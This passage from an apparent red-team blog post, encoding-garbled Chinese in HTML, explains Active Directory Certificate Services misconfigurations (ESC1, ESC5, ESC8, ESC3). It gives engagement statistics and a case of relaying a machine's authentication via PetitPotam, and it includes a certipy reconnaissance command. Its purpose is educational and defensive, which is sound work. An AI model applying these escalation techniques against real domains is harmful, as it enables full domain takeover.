&lt;p&gt;èˆ‰ä¾‹ä¾†èªªï¼Œç¶²åŸŸä½¿ç”¨è€…ç”³è«‹ User æ†‘è­‰è¦é€éå° CA ç™¼èµ· Certificate Signing Request (CSR)ï¼Œä¸¦æŒ‡å®š User æ†‘è­‰ç¯„æœ¬ï¼Œé€™å€‹éç¨‹ä¸­ CA æœƒé©—è­‰ä½¿ç”¨è€…çš„èº«åˆ†åŠæ¬Šé™ï¼Œè‹¥å…è¨±å‰‡æ ¹æ“šæ†‘è­‰ç¯„æœ¬çš„è¨­å®šé ’ç™¼æ†‘è­‰ï¼Œä½¿ç”¨è€…ä¾¿èƒ½ä»¥é€™å¼µæ†‘è­‰é€²è¡Œèº«åˆ†é©—è­‰å­˜å–ç¶²åŸŸå…§çš„è³‡æºï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œ AD CS çš„è¨­å®šå®¹æ˜“é€ æˆç–å¤±ï¼Œå¼±é»æœƒç™¼ç”Ÿåœ¨ &lt;strong&gt;CA åŠæ†‘è­‰ç¯„æœ¬çš„è¨­å®š&lt;/strong&gt;ä¸Šã€‚è‹¥æ”»æ“Šè€…æˆåŠŸåˆ©ç”¨é€™äº›æ¼æ´ï¼Œå¯èƒ½å°è‡´ç¶²åŸŸä¸­çš„é«˜æ¬Šé™ä½¿ç”¨è€…çš„æ†‘è­‰è¢«æ”»æ“Šè€…å–å¾—ä¸¦é©—è­‰æˆç‚ºé€™äº›èº«åˆ†ï¼Œè€Œå¾—ä»¥å­˜å–ç¶²åŸŸä¸­çš„æ©Ÿå¯†è³‡è¨Šã€‚åŠ ä¸Š&lt;strong&gt;è®Šæ›´å¯†ç¢¼ä¸¦ç„¡æ³•è®“æ†‘è­‰å¤±æ•ˆ&lt;/strong&gt;ï¼Œå¿…é ˆç›´æ¥æ’¤éŠ·è©²æ†‘è­‰ï¼Œè‹¥ä¸çŸ¥é“æ ¹å› æ”»æ“Šè€…é‚„æ˜¯å¯ä»¥ä»¥è©²èº«åˆ†å­˜å–ç¶²åŸŸï¼&lt;/p&gt;

&lt;p&gt;ç”šè‡³æ”»æ“Šè€…å¯å–å¾—æ ¹æ†‘è­‰çš„ç§é‘°ï¼Œå½é€ ä»»æ„èº«åˆ†çš„æ†‘è­‰ï¼Œé™¤äº†å¯å­˜å–æ‰€æœ‰ç¶²åŸŸè³‡æºå¤–ä¹Ÿéå¸¸é›£ä»¥åµæ¸¬ï¼Œé‚„éœ€è¦æ’¤éŠ·æ ¹æ†‘è­‰æ‰æœ‰è¾¦æ³•é¿å…å†è¢«å½é€ ã€‚é€™ä»£è¡¨ç¶²åŸŸä¸­çš„æ†‘è­‰çš†æœƒå¤±æ•ˆï¼Œå¾Œæœä¸å ªè¨­æƒ³ã€‚&lt;/p&gt;

&lt;p&gt;2021 å¹´ SpectreOps åœ˜éšŠæ•´ç†äº†&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;ç™½çš®æ›¸ Certified Pre-Owned&lt;/a&gt;ï¼Œæ–‡ä¸­æ­¸ç´äº†å„ç¨®æ”»æ“Šæ‰‹æ³•åŒ…æ‹¬ (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; è¡¨ç¤ºç·¨è™Ÿ)ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THEFTx&lt;/code&gt; - æ†‘è­‰ç«Šå–&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PERSISTx&lt;/code&gt; - ç¶²åŸŸå¸³è™Ÿæ¬Šé™ç¶­æŒ&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPERSISTx&lt;/code&gt; - ç¶²åŸŸæ¬Šé™ç¶­æŒ&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ESCx&lt;/code&gt; - ç¶²åŸŸææ¬Š&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç™½çš®æ›¸ä¸­ä¹ŸåŒ…æ‹¬äº†é˜²ç¦¦åŠåµæ¸¬çš„å»ºè­°ï¼Œéå¸¸å»ºè­°è®€è€…é–±è®€ï½&lt;/p&gt;

&lt;h2 id=&quot;å¯¦æˆ°çµ±è¨ˆ&quot;&gt;å¯¦æˆ°çµ±è¨ˆ&lt;/h2&gt;

&lt;p&gt;æˆªè‡³ 2025 å¹´ 1 æœˆï¼Œæˆ‘å€‘ç™¼ç¾åœ¨ä¸Šç™¾å ´ç´…éšŠæ¼”ç·´ä¸­ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;86.1% ä¼æ¥­æœ‰å®‰è£ AD CS&lt;/li&gt;
  &lt;li&gt;é€™äº›ä¼æ¥­ä¸­æœ‰ 70.1% å­˜åœ¨ä¸å®‰å…¨è¨­å®š&lt;/li&gt;
  &lt;li&gt;ä¸å®‰å…¨è¨­å®šä¸­ 90.9% å¯åˆ©ç”¨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç¸½è¨ˆä¾†èªªï¼Œè£æœ‰ AD CS çš„ AD ä¸­é«˜é” 54.9% å·¦å³çš„æ¯”ä¾‹å¯ä»¥&lt;strong&gt;ç›´æ¥å–å¾—ç¶²åŸŸæœ€é«˜æ¬Šé™&lt;/strong&gt;ï¼Œæ•´å€‹åˆ©ç”¨éç¨‹&lt;strong&gt;åƒ…éœ€æ•¸åˆ†é˜&lt;/strong&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™ä¹‹ä¸­å¯ä»¥ç´°åˆ†åˆ©ç”¨çš„æ‰‹æ³•ï¼Œå…¶ä¸­ä»¥ ESC1 ç™¼ç”Ÿçš„é »ç‡æœ€é«˜ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½ å¯èƒ½æƒ³å•çœŸçš„é€™éº¼å®¹æ˜“ç™¼ç”Ÿå—ï¼Ÿæ¥ä¸‹ä¾†æˆ‘å€‘ä¾†çœ‹çœ‹ä¸€å€‹å¸¸è¦‹çš„æƒ…å¢ƒå¯èƒ½é€ æˆé€™æ¨£çš„å¼±é»ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä¸€å€‹æ¼æ´çš„ç”¢ç”Ÿ&quot;&gt;ä¸€å€‹æ¼æ´çš„ç”¢ç”Ÿ&lt;/h2&gt;

&lt;p&gt;æƒ³åƒä½ æ˜¯ä¸€ä½ AD ç®¡ç†å“¡ï¼Œä»Šå¤©å…§ç¶²ç¶²ç«™çš„ç®¡ç†è€…èª¬ï¼šã€Œã„Ÿï¼æœ€è¿‘è¢«é€šå ±ç¶²ç«™æœƒè·³å‡ºé€£ç·šä¸å®‰å…¨çš„è­¦å‘Šï¼Œä¸è™•ç†æœƒè¢«é›»å•¦ï¼Œå¹«æˆ‘&lt;strong&gt;å¼„å€‹æ†‘è­‰&lt;/strong&gt;è™•ç†â¼€ä¸‹å¥½å—ï¼Ÿã€&lt;/p&gt;

&lt;p&gt;ã€Œå–”å°äº†ï¼Œâ¼€äº›æ¯”è¼ƒé‡è¦çš„ä¼ºæœå™¨æœ‰&lt;strong&gt;é›™å‘é©—è­‰&lt;/strong&gt;çš„éœ€æ±‚ï¼Œä¹Ÿâ¿‡ç…©å¹«è™•ç†â¼€ä¸‹ã€&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯ä½ é–‹å•Ÿ MMC.exe é€²å…¥æ†‘è­‰ç¯„æœ¬è¨­å®šé é¢ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é è¨­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Server&lt;/code&gt; æ†‘è­‰ç¯„æœ¬çš„ç‰ˆæœ¬æ˜¯ 1ï¼Œå¯è¨­å®šçš„é¸é …å¾ˆå°‘ã€‚ä½ è¤‡è£½å‡ºä¸€å¼µæ–°çš„ç¯„æœ¬ä¾†æ“ä½œï¼Œå‰µå»ºäº†ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CORP Web Server&lt;/code&gt; çš„æ†‘è­‰ç¯„æœ¬ä¸¦è¨­å®šå¥½æœ‰æ•ˆçš„æ™‚é–“ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/a.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è¦è®“ä½¿ç”¨è€…å¯è‡ªè¡Œç”³è«‹ï¼Œæ‰€ä»¥åŠ ä¸Šç”³è«‹æ¬Šé™ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/b.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å…§ç¶²ç®¡ç†è€…èªªä»–éœ€è¦é›™å‘é©—è­‰ï¼Œè€ŒåŸæœ¬çš„æ†‘è­‰ç¯„æœ¬çš„ EKU åªæœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Authentication&lt;/code&gt;ï¼Œé‚£å°±æ‰“é–‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt; æ²’éŒ¯å§ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/c.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åƒè€ƒä¸€ä¸‹ç¶²è·¯ä¸Šæ†‘è­‰çš„è¨­å®šï¼Œå¯ä»¥çœ‹åˆ°åƒæ˜¯å¾®è»Ÿå®˜æ–¹ç¶²ç«™ microsoft.com çš„æ†‘è­‰ä¹Ÿæœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Authentication&lt;/code&gt; ç­‰ EKUï¼Œçœ‹èµ·ä¾†è¨­å®šéå¸¸å®Œç¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œåœ¨ CA å•Ÿç”¨è©²æ†‘è­‰ç¯„æœ¬ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ¨£æ™®é€šçš„æµç¨‹å»é€ æˆäº† ESC1ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘æ¡ˆä¾‹ä¸­æœ€å¸¸è¦‹çš„ AD CS ææ¬Šå¼±é»ã€‚ä¸‹åˆ—æ˜¯ä»¥ &lt;a href=&quot;https://github.com/ly4k/Certipy&quot;&gt;certipy&lt;/a&gt; å·¥å…·æª¢æŸ¥çš„çµæœï¼Œæ»¿è¶³ä¸‹åˆ—æ¢ä»¶ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ†‘è­‰ç¯„æœ¬å•Ÿç”¨&lt;/li&gt;
  &lt;li&gt;å…è¨±ç”³è«‹è€…æŒ‡å®š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subject Alternative Name&lt;/code&gt; (SAN) æ¬„ä½ -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnrolleeSuppliesSubject&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;æ†‘è­‰ç¯„æœ¬çš„ EKU å…è¨±ç¶²åŸŸèªè­‰ï¼Œä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Smart Card Logon&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Any Purpose&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PKINIT Client Authentication&lt;/code&gt; æˆ–æ²’æœ‰ EKU&lt;/li&gt;
  &lt;li&gt;ä¸éœ€ç®¡ç†è€…æˆæ¬Šç”³è«‹&lt;/li&gt;
  &lt;li&gt;ä¸éœ€ç°½ç« &lt;/li&gt;
  &lt;li&gt;å…è¨±ä½æ¬Šé™ä½¿ç”¨è€…ç”³è«‹&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç°¡å–®ä¾†èªªï¼Œç”±æ–¼ AD CS æœƒä»¥ SAN æ¬„ä½ä¾†é©—è­‰ä½¿ç”¨è€…èº«åˆ†ï¼Œå› æ­¤è‹¥å¯ä»¥ä»»æ„ç”³è«‹è©²æ†‘è­‰ä¸”æŒ‡å®š SANï¼ŒåŠ ä¸Šè©²æ†‘è­‰å…è¨±å°ç¶²åŸŸèªè­‰æ™‚ï¼Œç”³è«‹è€…ä¾¿èƒ½&lt;strong&gt;å‡æ‰®ç‚ºä»»æ„ç¶²åŸŸä½¿ç”¨è€…&lt;/strong&gt;é€²è¡Œèº«åˆ†é©—è­‰ä¾†ææ¬Šã€‚&lt;/p&gt;

&lt;p&gt;é€™æ¨£ç°¡å–®çš„è¨­å®šç–å¤±ä¹Ÿéå¸¸å®¹æ˜“ç™¼ç”Ÿåœ¨ AD CS çš„å„ç¨®åœ°æ–¹ï¼Œä¾‹å¦‚ CA å®‰è£äº† Web Enrollment ç­‰ HTTP æœå‹™æ™‚å°±é è¨­å­˜åœ¨å¼±é» (ESC8)ï¼Œä¹Ÿé€ æˆå¦‚æ­¤é«˜æ¯”ä¾‹å®‰è£ AD CS çš„ä¼æ¥­å­˜åœ¨é€™äº›ä¸å®‰å…¨çš„è¨­å®šã€‚&lt;/p&gt;

&lt;p&gt;å¯¦æˆ°ä¸Šï¼Œæˆ‘å€‘ä¹Ÿæœ‰é‡åˆ°æ†‘è­‰ç¯„æœ¬åªå…è¨±ç‰¹å®šçš„ç¾¤çµ„ç”³è«‹ï¼Œç„¶è€Œè©²ç¾¤çµ„å»æ²’æœ‰è¶³å¤ çš„ä¿è­·ï¼Œå°è‡´æ”»æ“Šè€…å–å¾—é€™äº›æ¬Šé™çš„æˆæœ¬ä¸é«˜ï¼Œä¾‹å¦‚é€é Kerberoasting ç­‰æ‰‹æ³•å–å¾—å¯ç”³è«‹æ†‘è­‰çš„å¸³è™Ÿï¼Œ&lt;strong&gt;åƒ…åƒ…å¤šäº†ä¸€å€‹æ­¥é©Ÿï¼ŒåŒæ¨£å¯é”æˆç¶²åŸŸæ¥ç®¡&lt;/strong&gt;ï¼›åˆæˆ–æ˜¯é–‹å•Ÿäº†ç®¡ç†å“¡æˆæ¬Šç”³è«‹åŠæ‹”æ‰äº†ç”³è«‹æ¬Šé™ï¼Œä½†å»ç•™ä¸‹äº†å¯«å…¥æ¬Šé™ã€‚åœ¨é€™å€‹æƒ…å¢ƒä¸‹ï¼Œæ”»æ“Šè€…ä»å¯è‡ªè¡Œå°‡æ¬Šé™å¯«å…¥ä¸¦ç§»é™¤ç®¡ç†è€…æˆæ¬Šç”³è«‹çš„è¨­å®šï¼Œå°è‡´æ†‘è­‰ç¯„æœ¬ä»å¯è¢«åˆ©ç”¨ä¾†å–å¾—ç¶²åŸŸç®¡ç†å“¡æ¬Šé™ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç¶²åŸŸé¢¨éšª&quot;&gt;ç¶²åŸŸé¢¨éšª&lt;/h2&gt;

&lt;p&gt;å¤šæ•¸ä¼æ¥­æœƒå®‰è£ä¸€å€‹ç¶²åŸŸæ¨¹ç³»ï¼Œå†å¾€ä¸‹åˆ‡åˆ†å¤šå€‹å­ç¶²åŸŸé€²è¡Œç®¡ç†ï¼Œè¼ƒå°‘æ•¸æœƒåˆ‡å‡ºå¤šå€‹æ¨¹ç³»ï¼Œé€™æ¨£çš„åšæ³•åœ¨è³‡æºå­˜å–ä¸Šæœƒæœ‰è¼ƒå¤šçš„é™åˆ¶ï¼Œä½†åŒæ™‚æä¾›äº†æ›´å¥½çš„ä¿è­·å¾—ä»¥å°‡è³‡æºéš”é›¢ï¼Œä¾‹å¦‚åŒå€‹æ¨¹ç³»ä¸‹ CA ä¸éœ€é¡å¤–è¨­å®šå³å¯è®“æ‰€æœ‰çš„ç¶²åŸŸä½¿ç”¨è©² PKI æ¶æ§‹ï¼Œä½†ä¹Ÿä»£è¡¨è‹¥è©² CA è¢«å…¥ä¾µï¼Œå°‡å°è‡´æ‰€æœ‰åœ¨è©²æ¨¹ç³»çš„ç¶²åŸŸè¢«æ”»æ“Šè€…å–å¾—æ§åˆ¶æ¬Šã€‚&lt;/p&gt;

&lt;p&gt;å‡è¨­æ”»æ“Šè€…å–å¾—ä»»ä¸€å€‹å­ç¶²åŸŸçš„æ§åˆ¶æ¬Šé™ï¼Œå°æ–¼æ•´å€‹æ¨¹ç³»å°‡æœƒé€ æˆä»€éº¼æ¨£çš„é¢¨éšªï¼Ÿé€šå¸¸æˆ‘å€‘æœƒå…ˆåˆ©ç”¨ SID History Injection ç­‰æ”»æ“Šæ‰‹æ³•ææ¬Šåˆ°æ ¹ç¶²åŸŸï¼Œä½†ä¸¦ä¸æ˜¯æ¯å€‹ç¶²åŸŸç’°å¢ƒçš†å¯ç”¨ï¼Œå› ç‚ºé€™å€‹æ‰‹æ³•å¯èƒ½æœƒè¢« SID Filtering æ©Ÿåˆ¶æ‰€é˜»æ“‹ã€‚ç„¶è€Œï¼Œè‹¥æ˜¯ä¼æ¥­ä¸­å­˜åœ¨ AD CSï¼Œæ”»æ“Šè€…å¯ä»¥ä¿®æ”¹ LDAP çš„ Configuration Naming Context ä¸­ç›¸é—œçš„ PKI ç‰©ä»¶ï¼Œé€²è€Œå½±éŸ¿æ•´å€‹æ¨¹ç³»åŒ…å«æ ¹ç¶²åŸŸï¼Œæœ€çµ‚å–å¾— Enterprise Admins çš„æ†‘è­‰ï¼Œè©³ç´°æ‰‹æ³•å¯åƒè€ƒ SpecterOps åœ˜éšŠçš„æŠ€è¡“æ–‡ç«  &lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ›´é©šäººçš„æ˜¯ï¼Œåœ¨ç¶²åŸŸæ¨¹ç³»&lt;strong&gt;æ²’æœ‰ AD CS&lt;/strong&gt; çš„æƒ…å¢ƒä¸‹ï¼Œæ”»æ“Šè€…å¯è‡ªè¡Œå®‰è£ AD CS ææ¬Šåˆ°æ ¹ç¶²åŸŸï¼å¯¦éš›ä¸Šå…©å€‹æ‰‹æ³•çš„åŸç†å…¶å¯¦æ˜¯ç›¸åŒçš„ï¼Œå› ç‚ºæ¶µè“‹æ•´å€‹æ¨¹ç³»çš„è¨­å®šé™¤äº†å­ç¶²åŸŸæœƒå¾æ ¹ç¶²åŸŸå‘ä¸‹åŒæ­¥å¤–ï¼Œä¹Ÿæœƒå‘ä¸ŠåŒæ­¥ï¼Œå½±éŸ¿åˆ°æ ¹ç¶²åŸŸçš„è¨­å®šé”åˆ°ææ¬Šçš„æ•ˆæœã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼å¤šå€‹æ¨¹ç³»çš„æƒ…å¢ƒä¸‹ï¼Œä¸€å€‹ç¶²åŸŸæ¨¹ç³»çš„ CA è¢«å…¥ä¾µä¹Ÿæœ‰å¯èƒ½å°è‡´å…¶ä»–æ¨¹ç³»çš„æ·ªé™·ï¼Œä½†å‰æå¿…é ˆæœ‰é¡å¤–è¨­å®šè®“å…¶ä»–ç¶²åŸŸæ¨¹ç³»ä¿¡ä»»è©² CAï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœå…¶ä»–ç¶²åŸŸæ¨¹ç³»ä¿¡ä»»è¢«å…¥ä¾µçš„ CA çš„è©±ï¼Œæ”»æ“Šè€…å¯ä»¥ç°½ä»»æ„æ†‘è­‰å­˜å–é€™äº›æ¨¹ç³»ï¼Œçªç ´æ¨¹ç³»çš„ security boundaryã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼ AD CS çš„éƒ¨ç½²ï¼Œç†æƒ³æƒ…æ³æ‡‰å°‡ root CA é›¢ç·šï¼Œä¸¦ç”¨ subordinate CA ä¾†é ’ç™¼æ†‘è­‰ï¼Œä¹Ÿå°±æ˜¯å…©éšå±¤ä»¥ä¸Šçš„æ¶æ§‹å¦‚ &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786436(v=ws.11)&quot;&gt;Securing PKI: Planning a CA Hierarchy&lt;/a&gt; æ–‡ä¸­æ‰€è¿°ã€‚å‡è¨­ä¸å¹¸çš„ subordinate CA è¢«å…¥ä¾µï¼Œé‚„å¯é€éæ’¤éŠ·å…¶æ†‘è­‰ä¾†é¿å…éœ€è¦æ•´å€‹ PKI é‡å»ºçš„çª˜å¢ƒã€‚åœ¨å¤šå€‹æ¨¹ç³»çš„æ¶æ§‹ï¼Œé€™æ¨£çš„åšæ³•ä¹Ÿå¯ä»¥è®“æå®³ä¸è‡³æ–¼æ“´å¤§åˆ°å…¶ä»–æ¨¹ç³»ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ¡ˆä¾‹åˆ†äº«&quot;&gt;æ¡ˆä¾‹åˆ†äº«&lt;/h2&gt;

&lt;p&gt;åœ¨æˆ‘å€‘é‡åˆ°çš„æ¡ˆä¾‹ä¸­ï¼Œçµ•å¤§å¤šæ•¸æƒ…å¢ƒéƒ½æ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œå°è‡´æ•´å€‹ç¶²åŸŸæ¨¹ç³»åœ¨æ•¸åˆ†é˜å…§è¢«å–å¾—æœ€é«˜æ¬Šé™ã€‚æˆ‘å€‘æƒ³åˆ†äº«å¹¾å€‹ç‰¹åˆ¥çš„ä¾‹å­ï¼›é€™äº›ä¾‹å­æ˜¯å·²ç¶“ç¶“éä¸€å®šç¨‹åº¦çš„å¼·åŒ–ï¼Œç„¡æ³•ç›´æ¥åˆ©ç”¨æˆ–æ˜¯ä¸å­˜åœ¨ã€Œå®šç¾©ã€ä¸Šçš„å¼±é»ï¼Œå»ä»å¯è¢«æ”»æ“Šè€…é–“æ¥åˆ©ç”¨ï¼ŒæˆåŠŸå–å¾—ç¶²åŸŸæœ€é«˜æ¬Šé™çš„æ¡ˆä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;è¨»ï¼šä»¥ä¸‹æ¡ˆä¾‹çš†å·²å»è­˜åˆ¥åŒ–ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹ä¸€esc8--esc3-like-escalation&quot;&gt;æ¡ˆä¾‹ä¸€ï¼šESC8 + ESC3 like Escalation&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘é€²å…¥ä¼æ¥­å…§ç¶²ä¸¦å–å¾—ç¶²åŸŸå¸³è™Ÿå¾Œï¼Œèµ·æ‰‹å¼ç•¶ç„¶å…ˆæ˜¯ AD CS çš„åµå¯Ÿï¼Œé¦¬ä¸Šæå‡º certipy å·¥å…·ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certipy find &lt;span class=&quot;nt&quot;&gt;-stdout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user@corp.local&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çµæœé¡¯ç¤º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; é€™å€‹ CA å­˜åœ¨ ESC8 å¼±é»ï¼Œè©²å¼±é»çˆ² CA çš„ HTTP æœå‹™å¯è¢« relayï¼Œæ”»æ“Šè€…å¯é€é coerce æ‰‹æ³•ä¾‹å¦‚ PetitPotam å¼·åˆ¶è®“ Domain Controller ç­‰é‡è¦ä¸»æ©Ÿä¸»å‹•é€£ç·šåˆ°æ”»æ“Šè€…æ§åˆ¶çš„æ©Ÿå™¨ï¼Œé€²è€Œ relay åˆ° CA  çš„ HTTP æœå‹™ä¾†å–å¾—æ†‘è­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½† Domain Controller å¯ç”³è«‹çš„æ†‘è­‰ç¯„æœ¬åƒæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DomainController&lt;/code&gt; æˆ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Machine&lt;/code&gt; ç¯„æœ¬éƒ½æ²’æœ‰å•Ÿç”¨åœ¨å­˜åœ¨ ESC8 çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; ä¸Š (å¦‚ä¸‹åœ–)ï¼Œå› æ­¤éœ€è¦å…¶ä»–æ–¹å¼é€²è¡Œåˆ©ç”¨ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ™‚å€™æˆ‘å€‘æ³¨æ„åˆ°å¯ä¸²é€£é¡ä¼¼ ESC3 çš„åˆ©ç”¨éˆã€‚ESC3 çš„å¼±é»åœ¨æ–¼æ†‘è­‰ç¯„æœ¬å…·å‚™ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Certificate Request Agent&lt;/code&gt; EKUï¼Œç•¶å¯æˆåŠŸç”³è«‹é€™æ¨£çš„æ†‘è­‰ç¯„æœ¬æ™‚ï¼Œç”³è«‹è€…å¯ç”¨ç”³è«‹åˆ°çš„æ†‘è­‰å†ä»¥ä»»æ„èº«åˆ†ç”³è«‹å¦ä¸€å¼µæ†‘è­‰ã€‚å¾åµå¯Ÿçµæœï¼Œæˆ‘å€‘ç™¼ç¾å¦ä¸€å€‹ç¶²åŸŸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child1.corp.local&lt;/code&gt; çš„ä¸€å°æ©Ÿå™¨  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws01&lt;/code&gt; å¯ç”³è«‹ä¸‹åˆ— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; æ†‘è­‰ï¼Œå…¶æ»¿è¶³ Certified Pre-Owned ç™½çš®æ›¸ä¸­é™¤äº†ç”³è«‹æ¬Šé™ä¹‹å¤–çš„ ESC3 çš„ç¬¬ä¸€å¼µæ†‘è­‰ç¯„æœ¬æ¢ä»¶ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€é ESC8ï¼Œæˆ‘å€‘åˆ©ç”¨ PetitPotam æ‰‹æ³•è®“ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws01&lt;/code&gt; å°æˆ‘å€‘æ§åˆ¶çš„ä¸»æ©Ÿé€£ç·šï¼Œé€²è€Œ relay åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; ç”³è«‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; æ†‘è­‰ã€‚&lt;/p&gt;

